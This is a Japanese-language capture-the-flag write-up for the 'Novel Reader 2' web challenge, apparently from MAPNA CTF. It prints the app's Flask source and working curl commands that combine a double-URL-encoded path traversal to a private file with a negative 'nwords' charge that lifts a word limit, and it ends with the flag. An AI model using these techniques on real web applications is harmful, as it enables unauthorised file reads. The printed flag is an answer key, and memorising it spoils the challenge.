# Novel Reader 2:Web:46pts
Submit the second flag of "Novel Reader" here  

# Solution
[Novel reader](../Novel_reader)の続きのようだ。  
ファイル構造を再度確認すると以下のようであった。  
```bash
$ tree
.
├── index.html
├── main.py
├── private
│   └── A-Secret-Tale.txt
├── public
│   ├── A-Happy-Tale.txt
│   └── A-Sad-Tale.txt
└── static
    ├── script.js
    └── style.css

3 directories, 7 files
$ cat private/A-Secret-Tale.txt
Once a upon time there was a flag. The flag was read like this: MAPNA{test-flag}. FIN.
```
`private`の`A-Secret-Tale.txt`にフラグが書かれている。  
トラバーサルして読み取ってみる。  
```bash
$ curl -H 'Cookie: session=eyJjcmVkaXQiOjAsIndvcmRzX2JhbGFuY2UiOjExfQ.Za0PlQ._41fKxqQM14l0Afp4vvm1y5-bz4' --path-as-is 'http://3.64.250.135:9000/api/read/public/%252e%252e%252fprivate%252fA-Secret-Tale.txt'
{"msg":"Once a upon time there was a flag. The flag was... Charge your account to unlock more of the novel!","success":true}
```
途中までしか読み取れていない。  
ソースの読み取り個所を確認する。  
```python
~~~
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
~~~
```
スペースで分割されている。  
`buf[0:session['words_balance']]`により`buf[0:11]`しか読み取れていないことがわかる。  
`Words Balance`を管理する箇所を調査する。  
```python
~~~
@app.post('/api/charge')
def buyWord():
    nwords = request.args.get('nwords')
    if(nwords):
        nwords = int(nwords[:10])
        price = nwords * 10
        if(price <= session['credit']):
            session['credit'] -= price
            session['words_balance'] += nwords
            return {'success': True, 'msg': 'Added to your account!'}
        return {'success': False, 'msg': 'Not enough credit.'}, 402
    else:
        return {'success': False, 'msg': 'Missing parameteres.'}, 400
~~~
```
入力値`nwords`をintにキャストし、`session['words_balance'] += nwords`している。  
ここで負の数も使用できることに気づく。  
`Words Balance`を-2すると、`buf[0:-1]`となり、末尾の要素の一つ前まで取得できる。  
以下のように実行する。  
```bash
$ curl -X POST http://3.64.250.135:9000/api/charge?nwords=-2 -I
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Sun, 21 Jan 2024 12:52:51 GMT
Content-Type: application/json
Content-Length: 48
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=eyJjcmVkaXQiOjEyMCwid29yZHNfYmFsYW5jZSI6LTF9.Za0Tow.d4wb0ZkusjNa85pVXZ9OyNvjHBg; HttpOnly; Path=/

$ curl -H 'Cookie: session=eyJjcmVkaXQiOjEyMCwid29yZHNfYmFsYW5jZSI6LTF9.Za0Tow.d4wb0ZkusjNa85pVXZ9OyNvjHBg' --path-as-is 'http://3.64.250.135:9000/api/read/public/%252e%252e%252fprivate%252fA-Secret-Tale.txt'
{"msg":"Once a upon time there was a flag. The flag was read like this: MAPNA{uhhh-y0u-607-m3-4641n-3f4b38571}.... Charge your account to unlock more of the novel!","success":true}
```
flagが得られた。  

## MAPNA{uhhh-y0u-607-m3-4641n-3f4b38571}